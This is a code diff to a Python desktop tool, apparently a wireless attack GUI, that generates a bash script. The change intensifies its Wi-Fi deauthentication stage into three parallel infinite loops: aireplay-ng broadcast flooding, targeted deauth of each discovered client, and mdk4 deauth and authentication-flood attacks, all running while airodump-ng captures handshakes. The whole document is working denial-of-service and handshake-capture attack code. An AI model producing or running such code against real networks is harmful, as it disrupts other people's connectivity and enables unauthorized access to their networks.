@@ -1342,38 +1342,76 @@ class MaximWindow(QMainWindow):
         script.write("echo '══════════════════════════════════════════════════════════'\n")
         script.write("echo\n\n")
 
-        # Background: aggressive deauth — broadcast first, then target each station individually
-        script.write("echo '[2/3] Deauthing clients...'\n")
+        # Background: AGGRESSIVE multi-method deauth — runs 3 parallel attack threads
+        script.write("echo '[2/3] Deauthing clients (aggressive)...'\n\n")
+
+        # Thread 1: continuous aireplay-ng broadcast deauth (0 = infinite frames per burst)
+        script.write("# --- Deauth thread 1: aireplay-ng broadcast flood ---\n")
         script.write("(\n")
-        script.write("  sleep 5\n")  # let airodump collect stations first
+        script.write("  sleep 3\n")
         script.write("  while true; do\n")
-        # MDK3/MDK4 style: mass broadcast deauth flood
-        script.write(f"    sudo aireplay-ng --deauth 50 -a $BSSID {iface} >/dev/null 2>&1\n")
+        script.write(f"    sudo aireplay-ng --deauth 0 -a $BSSID {iface} 2>/dev/null &\n")
+        script.write("    AIREPLAY_PID=$!\n")
+        script.write("    sleep 8\n")
+        script.write("    kill $AIREPLAY_PID 2>/dev/null; wait $AIREPLAY_PID 2>/dev/null\n")
         script.write("    sleep 1\n")
-        # Target each individual station with heavy deauth
+        script.write("  done\n")
+        script.write(") &\n")
+        script.write("DEAUTH_PID1=$!\n\n")
+
+        # Thread 2: targeted per-station deauth
+        script.write("# --- Deauth thread 2: per-station targeted deauth ---\n")
+        script.write("(\n")
+        script.write("  sleep 8\n")  # let airodump discover stations first
+        script.write("  while true; do\n")
         script.write(f"    CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
         script.write("    if [ -n \"$CAP_CSV\" ]; then\n")
         script.write("      grep -i \"$BSSID\" \"$CAP_CSV\" | grep -Ev \"^$BSSID\" | grep -E '^[0-9A-Fa-f]{2}:' | while IFS=, read -r STA REST; do\n")
         script.write("        STA=$(echo \"$STA\" | tr -d ' ')\n")
         script.write("        if [ -n \"$STA\" ]; then\n")
-        script.write(f"          sudo aireplay-ng --deauth 50 -a $BSSID -c $STA {iface} >/dev/null 2>&1\n")
+        script.write(f"          echo \"  Deauth station: $STA\"\n")
+        script.write(f"          sudo aireplay-ng --deauth 0 -a $BSSID -c $STA {iface} 2>/dev/null &\n")
+        script.write("          SPID=$!\n")
+        script.write("          sleep 5\n")
+        script.write("          kill $SPID 2>/dev/null; wait $SPID 2>/dev/null\n")
         script.write("        fi\n")
         script.write("      done\n")
         script.write("    fi\n")
-        # Also try mdk4 if available — much more aggressive deauth
-        script.write(f"    if command -v mdk4 >/dev/null 2>&1; then\n")
-        script.write(f"      echo $BSSID > /tmp/maxim_mdk_target\n")
-        script.write(f"      sudo timeout 10 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL >/dev/null 2>&1\n")
-        script.write("    fi\n")
-        script.write("    sleep 3\n")
+        script.write("    sleep 2\n")
         script.write("  done\n")
         script.write(") &\n")
-        script.write("DEAUTH_PID=$!\n\n")
+        script.write("DEAUTH_PID2=$!\n\n")
+
+        # Thread 3: mdk4 — most aggressive, uses different deauth technique (EAPOL, disassoc)
+        script.write("# --- Deauth thread 3: mdk4 mass deauth + disassociation ---\n")
+        script.write("(\n")
+        script.write("  sleep 4\n")
+        script.write("  if command -v mdk4 >/dev/null 2>&1; then\n")
+        script.write("    echo $BSSID > /tmp/maxim_mdk_target\n")
+        script.write("    while true; do\n")
+        script.write(f"      echo '  mdk4 deauth blast...'\n")
+        script.write(f"      sudo timeout 15 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL 2>/dev/null\n")
+        script.write("      sleep 1\n")
+        # Also use mdk4 'a' mode (authentication DoS) to force clients to re-auth
+        script.write(f"      sudo timeout 10 mdk4 {iface} a -a $BSSID -m 2>/dev/null\n")
+        script.write("      sleep 2\n")
+        script.write("    done\n")
+        script.write("  fi\n")
+        script.write(") &\n")
+        script.write("DEAUTH_PID3=$!\n\n")
+
+        script.write("# Store all deauth PIDs for cleanup\n")
+        script.write("DEAUTH_PIDS=\"$DEAUTH_PID1 $DEAUTH_PID2 $DEAUTH_PID3\"\n\n")
 
         # Foreground: capture
         script.write(f"echo '[3/3] Capturing...'\n")
         script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' --output-format pcap,csv {iface}\n\n")
-        script.write("kill $DEAUTH_PID 2>/dev/null\n")
+        script.write("# Kill all deauth threads and their children\n")
+        script.write("for PID in $DEAUTH_PIDS; do\n")
+        script.write("  kill $PID 2>/dev/null; wait $PID 2>/dev/null\n")
+        script.write("done\n")
+        script.write("sudo pkill -f 'aireplay-ng.*--deauth' 2>/dev/null\n")
+        script.write("sudo pkill -f 'mdk4.*' 2>/dev/null\n")
         # Restore attack adapter to managed mode
         script.write(f"\n# ═══ CLEANUP: restore {iface} to managed mode ═══\n")
         script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
